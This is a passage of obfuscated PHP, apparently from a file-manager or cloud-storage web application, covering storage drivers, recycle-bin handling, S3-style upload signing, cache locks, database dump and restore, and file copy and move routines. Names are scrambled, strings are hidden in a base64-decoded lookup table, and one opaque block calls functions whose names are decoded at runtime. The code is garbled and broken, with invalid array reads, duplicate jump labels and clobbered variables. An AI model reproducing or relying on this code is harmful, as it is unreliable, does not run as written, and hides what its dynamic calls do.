f֏; f֏: if ($Fɑǃ[$F[403]] == $F[87]) { $aɋҷ = array($F[553] => array($F[512], $Fɑǃ[$F[487]] . $B󮌙 . $F[513])); $cɐ->where($aɋҷ)->setField($F[423], 0); $this->restoreFolderChildren($B󮌙, $c); } $this->where(array($F[395] => $B󮌙))->delete(); $cɐ->folderSizeReset($Fɑǃ[$F[478]]); goto E䢹; E䢹: $c[] = $Fɑǃ[$F[478]]; if ($Fɑǃ[$F[403]] == $F[87]) { $c[] = $B󮌙; } $cɐ->lockMoveEnd($B󮌙); goto c; c: } goto a; E: $F =& $_SERVER[]; $cɐ = Model($F[1213]); $F = $F == !1 ? !1 : $F; goto aޚ; A: } private function restoreFolderChildren($Cꠍ, $Eû) { goto cֳ; Bʍ: foreach ($Eû as $dה) { if ($dה == $Cꠍ) { continue; } if (!$fĠ->isParentOf($Cꠍ, $dה)) { continue; } $Dǎ = $fĠ->sourceInfo($dה); if ($Dǎ[$fỆ[403]] == $fỆ[87]) { $DΜ[] = array($fỆ[553] => array($fỆ[512], $Dǎ[$fỆ[487]] . $dה . $fỆ[513])); } else { $DΜ[$fỆ[395]][1][] = $dה; } } if (!$DΜ[$fỆ[395]][1]) { unset($DΜ[$fỆ[395]]); } if (!$DΜ) { return; } goto f땝; f땝: $DΜ[$fỆ[395]][1] = array_unique($DΜ[$fỆ[395]][1]); $DΜ[$fỆ[964]] = $fỆ[1788]; $fĠ->where($DΜ)->setField($fỆ[423], 1); goto d׽; cֳ: $fỆ =& $_SERVER[]; $fĠ = Model($fỆ[1213]); $DΜ = array($fỆ[395] => array($fỆ[7], array())); goto Bʍ; d׽: } private function recycleMove($b壯, $b = 1) { $C =& $_SERVER[]; $Dެ = Model($C[1213]); $d = Model($C[1997]); $Cѓ = array($C[395] => $b壯); if ($b) { $Dެ->where($Cѓ)->setField($C[423], 1); $d->eventRecycle($b壯, $C[1998]); } else { $F = $Dެ->where($Cѓ)->find(); $aǙ = $F[$C[403]] == $C[87]; $bݨ = $Dެ->fileNameAuto($F[$C[478]], $F[$C[28]], REPEAT_RENAME_FOLDER, $aǙ); if ($bݨ != $F[$C[28]]) { $Dެ->rename($b壯, $bݨ); } $Dެ->where($Cѓ)->setField($C[423], 0); $d->eventRecycle($b壯, $C[1999]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x73\164\x6f\162\141\147\x65\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\x7a\x65\115\141\x78", "\163\171\x73\164\145\155", "\x64\145\x66\x61\165\x6c\164", "\x64\162\151\x76\x65\x72", "\143\157\156\x66\x69\x67"); public function listData($E楐 = false, $aꐾ = "\x6d\x6f\x64\151\x66\x79\x54\x69\x6d\145", $fՈ = false) { $Cۋ =& $_SERVER[]; $Dֵ = parent::listData($E楐, $aꐾ, $fՈ); if ($E楐) { return $Dֵ; } $e = $this->ioSizeUseGet(array_to_keyvalue($Dֵ, $Cۋ[33], $Cۋ[393])); foreach ($Dֵ as $F柚 => $D匲ܮ) { unset($Dֵ[$F柚][$Cۋ[6]]); $Dֵ[$F柚][$Cۋ[1687]] = isset($e[$D匲ܮ[$Cۋ[393]]]) ? $e[$D匲ܮ[$Cۋ[393]]] : 0; } return $Dֵ; } public function ioSizeUseGet($dڑ) { goto Fȷ; aȺŴѝ: $a˒ = array($bꨭΓ[788] => array($bꨭΓ[7], $dڑ)); $bҔ = Model($bꨭΓ[753])->field($dё)->where($a˒)->group($bꨭΓ[788])->select(); $bҔ = array_to_keyvalue($bҔ, $bꨭΓ[393], $bꨭΓ[78]); goto A; A: Cache::set($F, $bҔ, 600); return $bҔ; goto B鍗; Fȷ: $bꨭΓ =& $_SERVER[]; if (!$dڑ) { return array(); } $F = $bꨭΓ[2000] . implode($bꨭΓ[47], $dڑ); goto C󓖎; C󓖎: $bҔ = Cache::get($F); if ($bҔ) { return $bҔ; } $dё = array($bꨭΓ[788] => $bꨭΓ[393], $bꨭΓ[2001] => $bꨭΓ[78]); goto aȺŴѝ; B鍗: } public function getConfig($fƎ) { $eʆ = parent::listData($fƎ); return json_decode($eʆ[$_SERVER[][6]], !0); } public function update($Eԫ, $A) { goto Eγ຅; Eγ຅: $c =& $_SERVER[]; $D = $A[$c[28]]; $C = array_to_keyvalue(parent::listData(), $c[28]); goto d; F: $c޶ = parent::update($Eԫ, $A); if ($c޶ && $A[$c[34]]) { foreach ($C as $dן) { if ($dן[$c[34]] && $dן[$c[393]] != $Eԫ) { parent::update($dן[$c[393]], array($c[34] => 0)); } } } return $c޶; goto f˥; d: if (isset($C[$D]) && $C[$D][$c[393]] != $Eԫ) { return !1; } if (isset($A[$c[2002]]) && $A[$c[2002]] == $c[87]) { $this->checkConfig($A); } unset($A[$c[2002]]); goto F; f˥: } public function add($fò¯) { goto Cֹ; Cֹ: $EѴܛ =& $_SERVER[]; $fɔ = array_to_keyvalue(parent::listData(), $EѴܛ[28]); if (isset($fɔ[$fò¯[$EѴܛ[28]]])) { return !1; } goto D晈; D晈: $this->checkConfig($fò¯); $eޖ = parent::insert($fò¯); if ($eޖ && $fò¯[$EѴܛ[34]]) { foreach ($fɔ as $B) { if ($B[$EѴܛ[34]]) { parent::update($B[$EѴܛ[393]], array($EѴܛ[34] => 0)); } } } goto dΕ; dΕ: return $eޖ; goto B҂; B҂: } public function checkConfig(&$DȪ, $b = false) { goto a; a: $A̵ě =& $_SERVER[]; $D¸ʦ = strtolower($DȪ[$A̵ě[94]]); $EЂ = json_decode($DȪ[$A̵ě[6]], !0); goto bڵ; e: $BΊ· = isset($eȑ׬͊[$D¸ʦ]) ? $eȑ׬͊[$D¸ʦ] : ucfirst($D¸ʦ); $cׂ = $A̵ě[72] . $BΊ·; if (!$BΊ· || !class_exists($cׂ)) { if ($b) { return LNG($A̵ě[2004]); } write_log(array($A̵ě[2005], $DȪ, get_caller_info()), $A̵ě[2006]); show_json(LNG($A̵ě[2004]), !1, $DȪ); } goto e; e: $C = new $cׂ($EЂ); if (in_array($D¸ʦ, $C->objectDriver)) { if (!$C->isBucketCors() && !$C->setBucketCors()) { $Cҹ = LNG($A̵ě[2007]); $Cҹ .= $A̵ě[2008] . LNG($A̵ě[2009]); if ($b) { return $Cҹ; } show_json($Cҹ, !1); } } $A = rtrim($EЂ[$A̵ě[1083]], $A̵ě[8]) . $A̵ě[8]; goto aẖ; bڵ: foreach ($EЂ as $C˺К => $F͇쪮) { $EЂ[$C˺К] = trim($F͇쪮); } $EЂ[$A̵ě[2003]] = rand_string(6); $eȑ׬͊ = $GLOBALS[$A̵ě[6]][$A̵ě[88]][$A̵ě[797]]; goto e; aẖ: $Eچ = $C->getPath($A . $A̵ě[1145]); if (!$C->mkfile($Eچ)) { if ($b) { return LNG($A̵ě[2007]); } show_json(LNG($A̵ě[2007]), !1); } $EЂ[$A̵ě[1083]] = $A; goto f; f: $DȪ[$A̵ě[6]] = json_encode($EЂ); $DȪ[$A̵ě[94]] = $BΊ·; return !0; goto F; F: } public function driverListSystem() { $aŤ =& $_SERVER[]; $E = parent::listData(); $FĖ = array(); foreach ($E as $Aͩջ¦) { unset($Aͩջ¦[$aŤ[194]], $Aͩջ¦[$aŤ[84]]); $Aͩջ¦[$aŤ[6]] = json_decode($Aͩջ¦[$aŤ[6]], !0); $FĖ[] = $Aͩջ¦; } return $FĖ; } public function defaultDriver() { $Fۺ =& $_SERVER[]; $dخ = parent::listData(); $CǠ = array_filter_by_field($dخ, $Fۺ[34], 1); $CǠ = $CǠ[0]; if ($CǠ) { $CǠ[$Fۺ[6]] = json_decode($CǠ[$Fۺ[6]], !0); } return $CǠ; } public function driverInfo($Bϋ) { $Bږ =& $_SERVER[]; $dϤ¸ = array_to_keyvalue(parent::listData(), $Bږ[393]); if (!isset($dϤ¸[$Bϋ])) { return !1; } $eх = $dϤ¸[$Bϋ]; $eх[$Bږ[6]] = json_decode($eх[$Bږ[6]], !0); return $eх; } public function remove($d㐫) { $this->removeShareItems($d㐫); return parent::remove($d㐫); } public function removeWithFile($Bω, $C) { goto a; d瞙: $e΅ = "\x7b\x69\x6f\x3a{$Bꚜ}\175\x2f"; $Eٞ = !0; $c = array(); goto B; B: $B = Model($f˧[193])->where($c)->field($f˧[2012])->select(); foreach ($B as $D) { goto fǜ; e: $e = array($f˧[788] => $Bꚜ, $f˧[76] => $E녮); Model($f˧[193])->where($c)->save($e); goto A߹׌; aَ: if (IO::exist($E녮)) { $Bǵ->updateFileEnd($D[$f˧[28]], $D[$f˧[78]]); continue; } if (!IO::move($CΧ, get_path_father($E녮))) { $Eٞ = !1; break; } $c = array($f˧[447] => $D[$f˧[447]]); goto e; fǜ: $CΧ = $D[$f˧[76]]; $E녮 = $e΅ . str_replace("\173\x69\157\72{$Bω}\175\57", $f˧[33], $CΧ); if (!IO::exist($CΧ)) { $c[] = $D[$f˧[447]]; $Bǵ->updateFileEnd($D[$f˧[28]], $D[$f˧[78]]); continue; } goto aَ; A߹׌: } $this->removeByFileID($c); goto Aޝ; Aޝ: if (!$Eٞ) { $Bǵ->stop($eǠ); return !1; } $Bǵ->end(); if ($C == $f˧[1667]) { $this->remove($Bω); } goto eΪ; f֯޸: $b = Model($f˧[450])->where($c)->sum($f˧[78]); $eǠ = $C . $f˧[2010] . $Bω; $Bǵ = new TaskFileTransfer($eǠ, $f˧[2006], $d, LNG($f˧[2011]) . "\x28{$Bω}\x29"); goto aۚ; aۚ: $Bǵ->task[$f˧[729]] = (double) $b; $C仫 = KodIO::defaultDriver(); $Bꚜ = $C仫[$f˧[393]]; goto d瞙; a: $f˧ =& $_SERVER[]; $c = array($f˧[788] => $Bω); $d = Model($f˧[450])->where($c)->count(); goto f֯޸; eΪ: } public function progress($D, $bƆ) { return Task::get($bƆ . $_SERVER[][2010] . $D); } private function removeByFileID($C = array()) { goto D؍Ϫ; Aҩ鋼: $dф = Model($f霰[1213])->where($dɸ̐)->field($f霰[395])->select(); if (!$dф) { return; } $dф = array_to_keyvalue($dф, $f霰[33], $f霰[395]); goto d; d: foreach ($dф as $b觠) { Model($f霰[409])->removeNow($b觠, !1); } goto c; D؍Ϫ: $f霰 =& $_SERVER[]; if (empty($C)) { return; } $dɸ̐ = array($f霰[447] => array($f霰[7], $C)); goto Aҩ鋼; c: } private function removeShareItems($fκ) { goto d; e: $e􂟲 = Model($fٝ[1678])->where($Eт)->field($fٝ[468])->select(); if (empty($e􂟲)) { return; } $f랪 = array_to_keyvalue($e􂟲, $fٝ[33], $fٝ[468]); goto F⏜; F⏜: Model($fٝ[563])->remove($f랪); goto eʐ; d: $fٝ =& $_SERVER[]; $dᓍ = "\x7b\x69\x6f\72{$fκ}\x7d\x2f"; $Eт = array($fٝ[395] => 0, $fٝ[1078] => array($fٝ[380], "{$dᓍ}\x25")); goto e; eʐ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x4c\151\147\150\x74\x41\x70\x70"; public $modelType = "\123\x79\163\164\x65\x6d\117\x70\x74\x69\157\156"; public $field = array("\156\x61\155\145", "\x67\x72\x6f\x75\x70", "\144\x65\163\143", "\143\157\156\x74\145\x6e\x74"); public function listData($aޅ = false, $B։ = "\x6d\x6f\144\x69\146\x79\124\x69\155\x65", $C𺗦 = true) { return parent::listData($aޅ, $B։, $C𺗦); } public function remove($c·) { $CǼ = $this->findByName($c·); if (!$CǼ) { return !1; } return parent::remove($CǼ[$_SERVER[][393]]); } public function add($bݐ݊) { if ($this->findByName($bݐ݊[$_SERVER[][28]])) { return !1; } return parent::insert($bݐ݊); } public function update($a߼ޤڠ, $c򪪃) { $B =& $_SERVER[]; $Eރ볜 = $this->findByName($a߼ޤڠ); $Fđ = $this->findByName($c򪪃[$B[28]]); if (!$Eރ볜 || $Fđ && $Fđ[$B[393]] != $Eރ볜[$B[393]]) { return !1; } return parent::update($Eރ볜[$B[393]], $c򪪃); } } goto aʼ; cߌՐ: class PathDriverEDS extends PathDriverMinIO { public function __construct($b) { parent::__construct($b); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($F풋Ѽ) { parent::__construct($F풋Ѽ); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($fȈ, $Cц = 3600) { goto b; aЃǠ: $AḞʊ = base64_encode(json_encode($aԤ)); $AÂ = hash_hmac($A̞[1241], $F, $A̞[1242] . $this->secret, !0); $F = hash_hmac($A̞[1241], $this->region, $AÂ, !0); goto D턇; BΪ: $F = $A̞[1233]; $dԵ = $Cц . $A̞[33]; $e͊ = $A̞[1196]; goto bĎ; Cέ: $a = array($A̞[211] => $A̞[33], $A̞[1243] => $A̞[33], $A̞[1200] => $c, $A̞[1204] => $e͊, $A̞[1208] => $AḞʊ, $A̞[1244] => $EÉ, $A̞[1245] => $DѮ, $A̞[1246] => $b싩, $A̞[1247] => $dԵ, $A̞[1248] => $d, $A̞[175] => $this->getHost()); return $a; goto e; B: $AҐ = $A̞[59]; $b싩 = gmdate($A̞[1232]); $F = gmdate($A̞[717]); goto BΪ; bĎ: $FЈ = array($this->accessKey, $F, $this->region, $AҐ, $F); $EÉ = implode($A̞[8], $FЈ); $aԤ = array($A̞[1198] => gmdate($A̞[1197], strtotime($A̞[1234])), $A̞[1199] => array(array($A̞[1201] => $this->bucket), array($A̞[1200] => $c), array($A̞[1202], $A̞[1203], $A̞[33]), array($A̞[1202], $A̞[1235], $A̞[33]), array($A̞[1202], $A̞[1236], $A̞[33]), array($A̞[1204] => $e͊), array($A̞[1237] => $EÉ), array($A̞[1238] => $DѮ), array($A̞[1239] => $b싩), array($A̞[1240] => $dԵ))); goto aЃǠ; D턇: $fϯꍠ = hash_hmac($A̞[1241], $AҐ, $F, !0); $f = hash_hmac($A̞[1241], $F, $fϯꍠ, !0); $d = hash_hmac($A̞[1241], $AḞʊ, $f); goto Cέ; b: $A̞ =& $_SERVER[]; $c = $A̞[192]; $DѮ = $A̞[1231]; goto B; e: } } if ($_SERVER[$_SERVER[][830]] != $_SERVER[$_SERVER[][831]]) { goto eӧ; aӌ: $Fބ = explode($_SERVER[][229], $bُ); if (count($Fބ) < $_SERVER[][584]) { $eɃ = $_SERVER[][835]; $eɃ(); } $D醞۬ = $_SERVER[][836]; goto d叡; eӧ: $e¥ = $_SERVER[][832]; $d = $_SERVER[$_SERVER[][833]] . $_SERVER[][834]; $bُ = $e¥($d); goto aӌ; d叡: $D醞۬($_SERVER[$_SERVER[][837]]); goto e䗃; e䗃: } goto d; EÞ梘: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Bԍ =& $_SERVER[]; $e鈯ɷ = $GLOBALS[$Bԍ[6]][$Bԍ[347]]; self::$cachePath = $e鈯ɷ[$Bԍ[193]][$Bԍ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e, $Fī = 0) { goto e˩; EՊ䵽: $Cȇ = rtrim(self::$cachePath, $cξڊ[8]) . $cξڊ[824] . md5($e) . $cξڊ[821]; if (file_exists($Cȇ) && filemtime($Cȇ) && filemtime($Cȇ) < time() - 10) { @unlink($Cȇ); } do { if (file_exists($Cȇ)) { cacheLockWait(); continue; } $C岳 = fopen($Cȇ, $cξڊ[825]); if (!$C岳) { return !1; } $FÎ = flock($C岳, LOCK_EX | LOCK_NB); self::$caches[$e] = array($cξڊ[826] => $C岳, $cξڊ[193] => $Cȇ); fwrite($C岳, $e๷); clearstatcache(); if ($C岳 && $FÎ) { return !0; } cacheLockWait(); } while (microtime(!0) < $e๷); goto eӐ; e˩: $cξڊ =& $_SERVER[]; $cן = microtime(!0); $e๷ = $cן + $Fī + 0.0001; goto EՊ䵽; eӐ: $this->unlock($e); return !1; goto bûМ; bûМ: } public function lockGet($E) { $D셂Ҿ =& $_SERVER[]; $e = rtrim(self::$cachePath, $D셂Ҿ[8]) . $D셂Ҿ[824] . md5($E) . $D셂Ҿ[821]; return file_exists($e); } public function unlock($a͌ᑊ) { goto bҟ; bҟ: $dߡ =& $_SERVER[]; $fǰ = self::$caches[$a͌ᑊ]; if (!$fǰ) { return; } goto E; E: @flock($fǰ[$dߡ[826]], LOCK_UN); @fclose($fǰ[$dߡ[826]]); @unlink($fǰ[$dߡ[193]]); goto B; B: unset(self::$caches[$a͌ᑊ]); goto b˥; b˥: } } class CacheLockRedis { public function lock($Fŕ, $AԷڙ = 10) { $BǑӷ = Cache::init(); $cޯ = microtime(!0) + $AԷڙ; while (microtime(!0) < $cޯ) { $b߾υ = $BǑӷ->get($Fŕ); if (!$b߾υ) { $DڎҪ = $BǑӷ->setLock($Fŕ, $cޯ, $AԷڙ); if ($DڎҪ) { return !0; } } else { if ($b߾υ < microtime(!0)) { $BǑӷ->set($Fŕ, $cޯ, $AԷڙ * 2); if ($BǑӷ->get($Fŕ) === $b߾υ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dꦋپ) { return Cache::init()->get($dꦋپ); } public function unlock($C˼) { return Cache::init()->remove($C˼); } } goto D޵; dݡ: $b׷æ = strrev(base64_decode($_SERVER[Ҟ䶹][0])); function binCheckNeq($aڵʎ, $dڿ) { return $aڵʎ != $dڿ; } $_SERVER[$_SERVER[Ҟ䶹][1]] = $b׷æ($_SERVER[$_SERVER[Ҟ䶹][2]]); goto Cˌ; cᙛ: class DbManage { function __construct($d, $e凼 = '') { $this->database = $d; $this->type = $e凼; } public function model($c = '') { return new ModelBase($c, $_SERVER[][33], $this->database); } public function db($d썅 = false) { goto BК; CЏɕ: $this->database = $Dᢄ; $b = $this->model()->db(); try { $aۍѝ = $b->execute("\163\x68\x6f\167\40\x64\x61\164\141\x62\x61\163\145\x73\40\x6c\x69\153\x65\40\x27{$E}\x27"); } catch (Exception $A) { } goto D; f: $E = $Dᢄ[$EƩɐ[936]]; $Dᢄ[$EƩɐ[936]] = $EƩɐ[33]; if ($Dᢄ[$EƩɐ[760]] == $EƩɐ[761]) { $Dߺ = $Dᢄ[$EƩɐ[762]]; $Dᢄ[$EƩɐ[762]] = substr($Dߺ, 0, strrpos($Dߺ, $EƩɐ[1024])); } goto CЏɕ; C팱: $this->database = $Dᢄ; $b->execute("\165\x73\x65\x20\140{$E}\x60"); return $b; goto dݱ; BК: $EƩɐ =& $_SERVER[]; $Dᢄ = array_change_key_case($this->database); if ($this->type == $EƩɐ[9] || !$d썅) { return $this->model()->db(); } goto f; D: if (!$aۍѝ) { $b->execute("\143\162\x65\x61\164\x65\40\x64\x61\164\141\x62\141\163\x65\x20\x60{$E}\140"); } $Dᢄ[$EƩɐ[936]] = $E; if ($Dᢄ[$EƩɐ[760]] == $EƩɐ[761]) { $Dᢄ[$EƩɐ[762]] .= $EƩɐ[1024] . $E; } goto C팱; dݱ: } public function createTable($CҌ, $bث = null) { $fؾ =& $_SERVER[]; if (!IO::exist($CҌ)) { ActionCall($fؾ[1025], !0, 0); show_json(LNG($fؾ[1026]), !1); } $Bγ = sqlSplit(IO::getContent($CҌ)); foreach ($Bγ as $F) { if ($bث) { $BЯ = stripos($F, $fؾ[1027]) === 0; if ($BЯ) { $bث->task[$fؾ[1028]] += 1; } } $this->model()->db()->execute($F); if ($bث && $BЯ) { preg_match($fؾ[1029], $F, $bѨ); $bث->task[$fؾ[1030]] = $bѨ[1]; $bث->update(1); } } $this->taskToCache($bث); } public function insertTable($f쉂ѐ, $B߇ř = null) { $cǐ =& $_SERVER[]; $Bኣ = $this->model()->db(); $Eÿ̮ = $F ? array($F) : $Bኣ->getTables(); foreach ($f쉂ѐ as $F) { $F = basename($F, $cǐ[752]); if (!in_array($F, $Eÿ̮)) { continue; } if ($B߇ř) { $B߇ř->task[$cǐ[1030]] = $F; } if (get_filesize($F) == 0) { continue; } $a = $this->sqlToDb($F, $B߇ř); if (!$a) { ActionCall($cǐ[1025], !0, 0); show_json(LNG($cǐ[1031]) . "\133{$F}\x5d", !1); } } $this->taskToCache($B߇ř); } public function sqlFromDb($C嫕ӂ, $d, $bḾ = null, $A = null) { goto a䊏; aƂ: $d͊ = 0; $A = 10000; $EЩ = fopen($d, $_SERVER[][1032]); goto b὜; a䊏: if ($bḾ) { $bḾ->task[$_SERVER[][1030]] = $C嫕ӂ; } $F݇ = $this->model($C嫕ӂ); $A = 0; goto aƂ; aƉ: fclose($EЩ); return $A; goto c簛; b὜: $b̓ = $F݇->getPk(); $d瞇 = $F݇->getDbFields(); do { $BȪ = array($b̓ => array($_SERVER[][978], $d͊)); $d = $F݇->where($BȪ)->field($d瞇)->order($b̓ . $_SERVER[][1033])->limit($A)->select(); $d = !empty($d) ? $d : array(); if (!($E = count($d))) { break; } $E = end($d); $d͊ = $E[$b̓]; $e폂 = array(); foreach ($d as $a) { if ($C嫕ӂ == $_SERVER[][1034] && $a[$_SERVER[][29]] == $_SERVER[][1035]) { $A = json_decode($a[$_SERVER[][372]], !0); if ($A[$_SERVER[][28]] == date($_SERVER[][717]) && !$A[$_SERVER[][716]]) { continue; } } if ($A) { $a[$_SERVER[][76]] = "\x7b\151\157\x3a{$A}\175" . substr($a[$_SERVER[][76]], strlen("\x7b\x69\157\72{$a[$_SERVER[][788]]}\x7d")); $a[$_SERVER[][788]] = $A; } $e폂[] = $_SERVER[][1036] . $this->sqlEncode($a) . $_SERVER[][1037]; } $F׃ = "\x49\x4e\123\105\x52\124\x20\111\x4e\124\117\40\x60{$C嫕ӂ}\x60\40\50\140" . implode($_SERVER[][1038], $d瞇) . $_SERVER[][1039]; fwrite($EЩ, $F׃ . implode($_SERVER[][1040], $e폂) . $_SERVER[][68] . PHP_EOL); $A += $E; if ($bḾ) { $bḾ->update($E); } } while ($A == $E); goto aƉ; c簛: } public function sqlToDb($cё, $AԪ = null) { goto CĚ֜; e: $Dܶ = array(); $B눯 = $this->type == $eƣ[9] ? 500 : 2000; $D = basename($cё, $eƣ[752]); goto B۷; c֦: if (!$Eڈߋ) { return !1; } $f = 0; $F˚ = $eƣ[33]; goto e; Cծ: if (!empty($Dܶ)) { $A׉ = $F˚ . implode($eƣ[47], $Dܶ); if (!$f¤->execute($A׉)) { return !1; } if ($AԪ) { $AԪ->update($f); } } return !0; goto bՎ; B۷: if ($D == $eƣ[1042]) { $B눯 = 50; } while (!feof($Eڈߋ)) { $b챳 = trim(fgets($Eڈߋ)); if (!$b챳) { continue; } $A׉ = $this->sqlDecode($b챳, $this->type); if (stripos($A׉, $eƣ[355]) === 0) { if (!$F˚) { $F˚ = $A׉ . $eƣ[50]; } continue; } if ($AԪ) { $AԪ->task[$eƣ[1028]] += 1; } $f++; $Dܶ[] = rtrim(rtrim(trim($A׉), $eƣ[47]), $eƣ[68]); if ($f >= $B눯) { $A׉ = $F˚ . implode($eƣ[47], $Dܶ); if (!$f¤->execute($A׉)) { return !1; } if ($AԪ) { $AԪ->update($f); } $Dܶ = array(); $f = 0; } } fclose($Eڈߋ); goto Cծ; CĚ֜: $eƣ =& $_SERVER[]; $f¤ = $this->model()->db(); $Eڈߋ = @fopen($cё, $eƣ[1041]); goto c֦; bՎ: } public function dropTable($e = null) { $dǗ = $this->model()->db(); $D = $e ? array($e) : $dǗ->getTables(); if (!$D) { return; } foreach ($D as $e) { $dǗ->execute("\144\162\157\160\x20\164\141\x62\x6c\145\x20\151\146\40\145\x78\x69\x73\164\163\x20\x60{$e}\x60"); } } private function taskToCache($EЧ = null) { $D˂ۺ =& $_SERVER[]; if (!$EЧ) { return; } $A؎ = array($D˂ۺ[1030] => $EЧ->task[$D˂ۺ[1030]], $D˂ۺ[1028] => $EЧ->task[$D˂ۺ[1028]], $D˂ۺ[1043] => $EЧ->task[$D˂ۺ[1043]]); if ($A؎[$D˂ۺ[1028]] == $A؎[$D˂ۺ[1043]]) { $A؎[$D˂ۺ[726]] = 1; } Cache::set($D˂ۺ[1044] . $EЧ->task[$D˂ۺ[393]], $A؎); $EЧ->end(); } private function sqlEncode($eԾ̧) { $e =& $_SERVER[]; $f눾 = array(); foreach ($eԾ̧ as $Bβ) { if (is_array($Bβ)) { $Bβ = json_encode_force($Bβ); } $Bβ = addslashes($Bβ); $Bβ = str_replace(array($e[1045], $e[229]), array($e[1046], $e[1047]), $Bβ); $f눾[] = str_replace($e[55], $e[1048], $Bβ); } return $e[55] . implode($e[1049], $f눾) . $e[55]; } private function sqlDecode($D, $Cˡ) { $D =& $_SERVER[]; $D = str_replace(array($D[1046], $D[1047]), array($D[1045], $D[229]), $D); if ($Cˡ == $D[9]) { $D = stripslashes($D); } return $D; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F, $Dэ) { goto a; D: Hook::trigger($B莟[1051] . $F . $B莟[1054], $eǬ, $C); return $C; goto D; Aǘ: Hook::trigger($B莟[1051] . $F . $B莟[1052], $eǬ); $Eŧӎ = self::driverMake($Dэ[0]); if (method_exists($Eŧӎ, $F)) { $C = @call_user_func_array(array($Eŧӎ, $F), $Dэ); } else { if (method_exists($Eŧӎ, $B莟[1053])) { $C = @call_user_func_array(array($Eŧӎ, $F), $Dэ); } else { if (method_exists(self, $F)) { $C = @call_user_func_array(array(self, $F), $Dэ); } else { $C = call_user_func_array(array(parent, $F), $Dэ); } } } goto D; a: $B莟 =& $_SERVER[]; $eǬ = $Dэ; $GLOBALS[$B莟[1050]] = $B莟[1051] . $F; goto Aǘ; D: } public static function init($b˥) { return self::driverMake($b˥); } public static function copy($d, $BΎ, $E٭ = false, $f = false) { return self::copyMoveStart($d, $BΎ, $E٭, $_SERVER[][518], $f); } public static function move($E, $d, $aߔ = false, $eÕ = false) { return self::copyMoveStart($E, $d, $aߔ, $_SERVER[][520], $eÕ); } private static function copyMoveStart($B, $B, $bܳ, $Dٍ, $f) { $dܽ =& $_SERVER[]; $c = array($B, $B, $bܳ, $f); Hook::trigger($dܽ[1051] . $Dٍ . $dܽ[1052], $c); $bĕ = self::copyMove($B, $B, $bܳ, $Dٍ, $f); Hook::trigger($dܽ[1051] . $Dٍ . $dܽ[1054], $c, $bĕ); return $bĕ; } public static function saveFile($f䘌, $C᱙, $Aĸ = true) { goto Cϕή; AԜ: return $b۽; goto Aҕ; bܘ: if ($Cˮഉ->pathParse[$C԰[1055]]) { $Cˮഉ = self::driverMake($Cˮഉ->pathParse[$C԰[1055]]); } $f = $a->pathFather($C᱙); $F뼛ՙ = !0; goto Dߧ; Dߧ: if (!$Aĸ && self::driverIsSame($Cˮഉ, $a)) { $F뼛ՙ = !1; } $b۽ = self::copyFile($Cˮഉ, $f䘌, $a, $f, $cʏ[$C԰[28]], $F뼛ՙ); if ($E؜剌) { $b۽ = $E؜剌->getPathOuter($b۽); } goto AԜ; AŴ: $a = self::driverMake($C᱙); $E؜剌 = !1; if ($a->pathParse[$C԰[1055]]) { $E؜剌 = $a; $a = self::driverMake($a->pathParse[$C԰[1055]]); } goto bܘ; Cϕή: $C԰ =& $_SERVER[]; $cʏ = self::info($C᱙); $Cˮഉ = self::driverMake($f䘌); goto AŴ; Aҕ: } private static function copyMove($dՠ, $e, $C阿, $f, $e܂ = false) { goto C; b: self::check($AƯ, $dՠ, $F, $e); Hook::trigger($B[73], $AƯ, $dՠ, $F, $e); $b = self::driverIsSame($AƯ, $F); goto Aĺ; C: $B =& $_SERVER[]; if (!$dՠ || $dՠ == $B[8] || !$e) { return !1; } ignore_timeout(); goto fԻ; E: if ($B̇ && $d׹) { $AƯ->remove($dՠ); } if ($b̼) { $B̇ = $b̼->getPathOuter($B̇); } return $B̇; goto AŨ; Aĺ: if ($b) { if ($f == $B[520] && !method_exists($F, $B[1056]) && trim($e, $B[8]) == trim($F->pathFather($dՠ), $B[8])) { if ($AƯ->pathThis($dՠ) != $e܂ && !$AƯ->isTypeObject()) { return $AƯ->rename($dՠ, $e܂); } return $F->getPathOuter($dՠ); } if (method_exists($F, $f)) { return $F->{$f}($dՠ, $e, $C阿); } } $cͪݧ = $AƯ->isFile($dՠ); if (!$cͪݧ && $F->getType() == $B[724] && $AƯ->getType() == $B[106]) { $B̇ = $F->copyFolderFromIO($AƯ, $dՠ, $e, $C阿, $d׹, $e܂); } else { $B̇ = self::copyPath($AƯ, $dՠ, $F, $e, $C阿, $d׹, $cͪݧ, $e܂); } goto E; fԻ: $AƯ = self::driverMake($dՠ); $F = self::driverMake($e); $d׹ = $f == $B[520]; goto f; f: $b̼ = !1; if ($F->pathParse[$B[1055]]) { $b̼ = $F; $F = self::driverMake($F->pathParse[$B[1055]]); } if ($AƯ->pathParse[$B[1055]]) { $AƯ = self::driverMake($AƯ->pathParse[$B[1055]]); } goto b; AŨ: } private static function check($b쇤̎, $a䑝, $d, &$c) { $fճ =& $_SERVER[]; if (self::driverIsSame($b쇤̎, $d) && $b쇤̎->isFolder($a䑝) && $b쇤̎->isParentOf($a䑝, $c)) { show_json(LNG($fճ[1057]), !1); } if (!$b쇤̎->exist($a䑝)) { show_json(LNG($fճ[105]), !1); } } private static function copyPath($a͊, $D, $d×ޏ, $Fۗ⩋, $Bۄ, $dě, $E׻, $fŎ = false) { goto bې; c: $a쌈˥ = is_array($a쌈˥) ? $a쌈˥ : array($c[74] => array(), $c[75] => array()); $eд = array_merge($a쌈˥[$c[74]], $a쌈˥[$c[75]]); foreach ($eд as $Aʊ) { $d޼̯ = $Aʊ[$c[29]] == $c[193]; $D = $a͊->getPathInner($Aʊ[$c[76]]); $Fݿ = self::copyPath($a͊, $D, $d×ޏ, $Fۗ⩋, $Bۄ, $dě, $d޼̯); if (!$Fݿ) { IO::errorTips($c[1058] . $D . $c[67] . $Fۗ⩋); } } goto CУ; Dʩ: $A͚ = $d×ޏ->mkdir($d×ޏ->getPath($c罾)); $Fۗ⩋ = $d×ޏ->getPathInner($A͚); $a쌈˥ = $a͊->listPath($D, !0); goto c; 